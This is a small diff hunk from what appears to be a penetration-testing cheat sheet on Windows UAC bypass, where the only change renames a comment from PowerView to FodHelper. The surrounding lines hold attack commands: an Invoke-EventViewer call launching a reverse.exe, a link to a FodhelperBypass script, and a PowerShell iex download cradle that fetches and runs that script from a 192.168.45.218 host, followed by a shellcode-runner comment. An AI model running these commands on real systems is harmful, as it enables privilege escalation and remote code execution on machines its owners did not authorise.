@@ -896,7 +896,7 @@ Invoke-EventViewer c:\temp\reverse.exe
 OR using [FodhelperBypass.ps1](https://raw.githubusercontent.com/winscripting/UAC-bypass/refs/heads/master/FodhelperBypass.ps1)
 
 ```powershell
-# Load PowerView in memory
+# Load FodHelper in memory
 iex (new-object net.webclient).downloadstring('http://192.168.45.218/FodhelperBypass.ps1')
 
 # Using ps_shellcode_runner
